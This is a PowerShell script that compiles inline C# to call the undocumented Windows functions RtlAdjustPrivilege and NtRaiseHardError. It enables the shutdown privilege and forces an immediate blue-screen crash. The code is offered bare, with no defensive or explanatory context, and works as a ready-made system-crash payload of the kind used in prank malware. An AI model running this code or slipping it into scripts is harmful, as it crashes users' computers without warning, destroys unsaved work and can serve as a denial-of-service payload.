$source = @"
using System;
using System.Runtime.InteropServices;

public class BsodTrigger {
    [DllImport("ntdll.dll")]
    public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

    [DllImport("ntdll.dll")]
    public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

    public static void Trigger() {
        bool previousValue;
        RtlAdjustPrivilege(19, true, false, out previousValue); // SeShutdownPrivilege
        uint response;
        NtRaiseHardError(0xDEADDEAD, 0, 0, IntPtr.Zero, 6, out response); // MANUALLY_INITIATED_CRASH1
    }
}
"@

Add-Type -TypeDefinition $source
[BsodTrigger]::Trigger()
